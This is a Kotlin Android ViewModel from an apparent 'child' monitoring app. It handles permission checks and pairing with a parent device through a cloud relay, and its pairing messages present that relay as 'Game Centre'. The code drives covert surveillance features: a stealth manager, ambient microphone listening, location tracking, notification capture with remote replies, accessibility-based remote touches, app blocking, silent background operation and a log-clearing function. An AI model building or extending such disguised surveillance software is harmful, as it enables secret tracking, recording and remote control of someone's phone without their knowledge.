package com.example.ui

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.AirDroidChildApp
import com.example.data.model.DaemonLog
import com.example.data.model.DaemonStatus
import com.example.data.model.PairedParentDevice
import com.example.data.model.SyncedNotification
import com.example.engine.ChildLocation
import com.example.service.AirDroidAccessibilityService
import com.example.service.AirDroidDaemonService
import com.example.service.AirDroidNotificationListenerService
import com.example.data.network.CloudRelayClient
import com.example.data.network.CloudConfig
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import java.util.UUID
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

sealed class AppDestination {
    object Splash : AppDestination()
    object Pairing : AppDestination()
    object PermissionWizard : AppDestination()
    object Dashboard : AppDestination()
}

data class PermissionStatus(
    val storage: Boolean = false,
    val notificationListener: Boolean = false,
    val overlay: Boolean = false,
    val accessibility: Boolean = false,
    val usageStats: Boolean = false,
    val batteryOptimization: Boolean = false,
    val camera: Boolean = false,
    val audio: Boolean = false,
    val location: Boolean = false,
    val isSetupRemembered: Boolean = false
) {
    val allEssentialGranted: Boolean
        get() = isSetupRemembered || (storage && notificationListener && accessibility && usageStats && batteryOptimization)
}

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val repository = AirDroidChildApp.repository
    private val touchEngine = AirDroidChildApp.touchEngine
    private val daemonServer = AirDroidChildApp.daemonServer
    private val stealthManager = AirDroidChildApp.stealthManager
    private val audioManager = AirDroidChildApp.audioManager
    private val locationManager = AirDroidChildApp.locationManager
    private val cloudRelay = CloudRelayClient(application)

    private val _currentDestination = MutableStateFlow<AppDestination>(AppDestination.Splash)
    val currentDestination: StateFlow<AppDestination> = _currentDestination.asStateFlow()

    private val _permissionStatus = MutableStateFlow(PermissionStatus())
    val permissionStatus: StateFlow<PermissionStatus> = _permissionStatus.asStateFlow()


    private val _pairingCode = MutableStateFlow("")
    val pairingCode: StateFlow<String> = _pairingCode.asStateFlow()

    private val _pairingStatusMessage = MutableStateFlow<String?>(null)

    init {
        // The Child listener must be reachable before pairing so the Parent can verify this device.
        AirDroidDaemonService.startService(application)
        cloudRelay.startIfPaired()
    }
    val pairingStatusMessage: StateFlow<String?> = _pairingStatusMessage.asStateFlow()

    val pairedDevices: StateFlow<List<PairedParentDevice>> =
        repository?.pairedDevices?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val activeDevice: StateFlow<PairedParentDevice?> =
        repository?.activeDevice?.stateIn(viewModelScope, SharingStarted.Lazily, null)
            ?: MutableStateFlow(null)

    val recentLogs: StateFlow<List<DaemonLog>> =
        repository?.recentLogs?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val recentNotifications: StateFlow<List<SyncedNotification>> =
        repository?.recentNotifications?.stateIn(viewModelScope, SharingStarted.Lazily, emptyList())
            ?: MutableStateFlow(emptyList())

    val daemonStatus: StateFlow<DaemonStatus> =
        daemonServer?.status ?: MutableStateFlow(DaemonStatus.STOPPED)

    val connectedClientsCount: StateFlow<Int> =
        daemonServer?.connectedClientsCount ?: MutableStateFlow(0)

    val touchesExecuted: StateFlow<Int> =
        daemonServer?.touchesExecuted ?: MutableStateFlow(0)

    val notificationsSyncedCount: StateFlow<Int> =
        daemonServer?.notificationsSyncedCount ?: MutableStateFlow(0)

    val blockedPackages: StateFlow<Set<String>> =
        stealthManager?.blockedPackages ?: MutableStateFlow(emptySet())

    val childLocation: StateFlow<ChildLocation?> =
        locationManager?.currentLocation ?: MutableStateFlow(null)

    val isAudioListening: StateFlow<Boolean> =
        audioManager?.isRecording ?: MutableStateFlow(false)

    val ambientDecibels: StateFlow<Float> =
        audioManager?.ambientDecibels ?: MutableStateFlow(0f)

    init {
        checkPermissions()
        refreshPairedState()
    }

    fun navigateTo(destination: AppDestination) {
        _currentDestination.value = destination
    }

    fun checkPermissions() {
        val context = getApplication<Application>()

        // 1. Storage
        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }

        // 2. Notification Listener
        val notifGranted = try {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            )
            flat != null && flat.contains(context.packageName)
        } catch (e: Exception) {
            false
        }

        // 3. Overlay (Display over other apps)
        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else true

        // 4. Accessibility Service
        val accessibilityGranted = touchEngine?.isAccessibilityPermissionGranted() ?: false

        // 5. Usage Access
        val usageStatsGranted = try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= 29) appOps.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), context.packageName) else android.app.AppOpsManager.MODE_DEFAULT
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }

        // 6. Battery Optimization Exemption
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val batteryGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
        } else true

        // 6. Camera
        val cameraGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        // 7. Audio / Mic
        val audioGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        // 8. Location
        val locationGranted = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        val setupRemembered = stealthManager?.isSetupCompleted?.value ?: false

        _permissionStatus.value = PermissionStatus(
            storage = storageGranted,
            notificationListener = notifGranted,
            overlay = overlayGranted,
            accessibility = accessibilityGranted,
            usageStats = usageStatsGranted,
            batteryOptimization = batteryGranted,
            camera = cameraGranted,
            audio = audioGranted,
            location = locationGranted,
            isSetupRemembered = setupRemembered
        )
    }

    fun markSetupCompletedAndRemember() {
        if (!_permissionStatus.value.allEssentialGranted) return
        stealthManager?.setSetupCompleted(true)
        checkPermissions()
        viewModelScope.launch {
            repository?.logAction("SETUP_REMEMBERED", "Permissions permanently authorized & remembered for silent background operation")
        }
    }

    fun rememberPermissionsAndLock() = markSetupCompletedAndRemember()

    fun toggleAppBlock(pkg: String, block: Boolean) {
        if (block) {
            stealthManager?.addBlockedPackage(pkg)
        } else {
            stealthManager?.removeBlockedPackage(pkg)
        }
    }

    fun toggleAmbientAudio() {
        if (audioManager?.isRecording?.value == true) {
            audioManager.stopListening()
        } else {
            audioManager?.startListening()
        }
    }

    fun refreshLocation() {
        locationManager?.startTracking()
    }



    fun pairWithCode(inputCode: String) {
        viewModelScope.launch(kotlinx.coroutines.Dispatchers.IO) {
            val code = inputCode.trim().uppercase()
            if (code.length != 8) {
                _pairingStatusMessage.value = "Enter the 8-character code shown by Parent."
                return@launch
            }
            _pairingStatusMessage.value = "Connecting to Game Centre cloud…"
            val prefs = getApplication<Application>().getSharedPreferences("child_pairing", Context.MODE_PRIVATE)
            val token = prefs.getString("authToken", null) ?: UUID.randomUUID().toString().replace("-", "")
            val deviceId = android.provider.Settings.Secure.getString(getApplication<Application>().contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: UUID.randomUUID().toString()
            try {
                val body = JSONObject().apply {
                    put("code", code)
                    put("deviceId", deviceId)
                    put("childToken", token)
                    put("name", Build.MODEL)
                    put("model", Build.MODEL)
                    put("os", Build.VERSION.RELEASE)
                }.toString()
                val url = URL(CloudConfig.BASE_URL.trimEnd('/') + "/api/child/pair")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"; connectTimeout = 8000; readTimeout = 8000; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                val responseCode = conn.responseCode
                val stream = if (responseCode in 200..299) conn.inputStream else conn.errorStream
                val responseBody = stream?.bufferedReader()?.use { it.readText() }.orEmpty()
                conn.disconnect()
                val json = try { JSONObject(responseBody) } catch (_: Exception) { JSONObject() }
                val accepted = responseCode in 200..299 && json.optBoolean("ok", false)
                if (!accepted) {
                    _pairingStatusMessage.value = "Pairing rejected (HTTP $responseCode): " + responseBody.take(120)
                    return@launch
                }
                prefs.edit().putString("parentCode", code).putString("authToken", token).apply()
                repository?.logAction("PAIRING_AUTHORIZED", "Parent registered this child through the Game Centre cloud relay")
                cloudRelay.startIfPaired()
                AirDroidDaemonService.startService(getApplication())
                _pairingCode.value = code
                _pairingStatusMessage.value = "Pairing verified. Cloud connection started."
                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) { _currentDestination.value = AppDestination.Dashboard }
            } catch (e: Exception) {
                _pairingStatusMessage.value = "Could not reach Game Centre server: ${e.message ?: e.javaClass.simpleName}"
            }
        }
    }


    fun toggleDaemonService() {
        val context = getApplication<Application>()
        if (_permissionStatus.value.accessibility) {
            if (daemonStatus.value == DaemonStatus.STOPPED) {
                AirDroidDaemonService.startService(context)
            } else {
                AirDroidDaemonService.stopService(context)
            }
        }
    }

    fun pauseOrResumeDaemon() {
        val context = getApplication<Application>()
        val intent = Intent(context, AirDroidDaemonService::class.java).apply {
            action = if (daemonStatus.value == DaemonStatus.PAUSED) {
                AirDroidDaemonService.ACTION_RESUME
            } else {
                AirDroidDaemonService.ACTION_PAUSE
            }
        }
        context.startService(intent)
    }

    fun sendQuickReply(key: String, text: String) {
        viewModelScope.launch {
            val service = AirDroidNotificationListenerService.instance
            val success = service?.sendQuickReply(key, text) ?: false
            repository?.logAction("QUICK_REPLY", "Quick reply: \"$text\"", isSuccess = success)
        }
    }

    fun clearAuditLogs() {
        viewModelScope.launch {
            repository?.clearLogs()
        }
    }

    private fun refreshPairedState() {
        viewModelScope.launch {
            val active = repository?.getDeviceByCode(_pairingCode.value)
            if (active != null) {
                AirDroidDaemonService.startService(getApplication())
            }
        }
    }
}
